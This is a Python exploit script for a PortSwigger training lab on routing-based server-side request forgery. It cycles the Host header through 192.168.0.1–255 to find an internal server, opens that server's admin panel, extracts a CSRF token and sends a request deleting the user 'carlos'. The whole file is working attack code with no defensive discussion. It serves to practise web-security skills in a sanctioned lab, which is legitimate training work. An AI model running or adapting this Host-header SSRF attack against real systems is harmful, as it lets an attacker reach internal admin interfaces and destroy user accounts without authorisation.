# Routing-based SSRF

# https://portswigger.net/web-security/host-header/exploiting/lab-host-header-routing-based-ssrf

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def delete_carlos(s, url):
	print('\n[+] Trying to access to the Admin Panel on the local Network...')
	admin_path = url + '/admin'
	session_cookie = s.cookies['session']
	lab_cookie = s.cookies['_lab']
	for i in range(1, 256):
		cookies = {'session': session_cookie, '_lab': lab_cookie}
		headers = {'Host': '192.168.0.' + str(i)}
		sys.stdout.write('\r[+] Using Header:\t%s\r' % headers)
		r = s.get(url, headers=headers, allow_redirects=False, cookies=cookies)
		time.sleep(1)
		if r.status_code == 302:
			print(f'\n[+] Found Valid Host on the local network:\tHost: 192.168.0.{str(i)}')
			cookies = {'session': session_cookie, '_lab': lab_cookie}
			r = s.get(admin_path, headers=headers, cookies=cookies)
			csrf_token = get_csrf_token(r)
			delete_data = {
				'csrf': csrf_token,
				'username': 'carlos'
			}
			delete_path = url + '/admin/delete'
			if r.status_code == 200:
				print('\r\n[+] Trying to delete Carlos user...')
				r = s.post(delete_path, headers=headers, data=delete_data, cookies=cookies)
				break
		sys.stdout.flush()


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Routing-based SSRF')
	parser = argparse.ArgumentParser(description="[+] Lab: Routing-based SSRF")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find a way to delete Carlos account...\n')
			time.sleep(1)
			r = s.get(url)
			delete_carlos(s, url)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
